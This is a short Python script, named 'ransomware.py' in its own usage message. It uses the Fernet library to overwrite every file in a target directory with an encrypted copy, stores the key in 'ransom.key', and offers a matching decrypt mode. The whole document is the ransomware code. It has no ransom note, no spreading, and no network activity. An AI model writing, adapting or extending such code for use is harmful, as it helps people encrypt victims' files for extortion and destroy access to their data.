from cryptography.fernet import Fernet
import os

KEY_FILE = 'ransom.key'
TARGET_DIR = './target_files'

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as key_file:
        key_file.write(key)

def load_key():
    return open(KEY_FILE, 'rb').read()

def encrypt_files(key):
    fernet = Fernet(key)
    for filename in os.listdir(TARGET_DIR):
        filepath = os.path.join(TARGET_DIR, filename)
        with open(filepath, 'rb') as file:
            encrypted = fernet.encrypt(file.read())
        with open(filepath, 'wb') as file:
            file.write(encrypted)

def decrypt_files(key):
    fernet = Fernet(key)
    for filename in os.listdir(TARGET_DIR):
        filepath = os.path.join(TARGET_DIR, filename)
        with open(filepath, 'rb') as file:
            decrypted = fernet.decrypt(file.read())
        with open(filepath, 'wb') as file:
            file.write(decrypted)

if __name__ == "__main__":
    import sys
    action = sys.argv[1] if len(sys.argv) > 1 else ""
    if action == "encrypt":
        generate_key()
        key = load_key()
        encrypt_files(key)
        print("[+] Files encrypted.")
    elif action == "decrypt":
        key = load_key()
        decrypt_files(key)
        print("[+] Files decrypted.")
    else:
        print("Usage: python3 ransomware.py [encrypt|decrypt]")
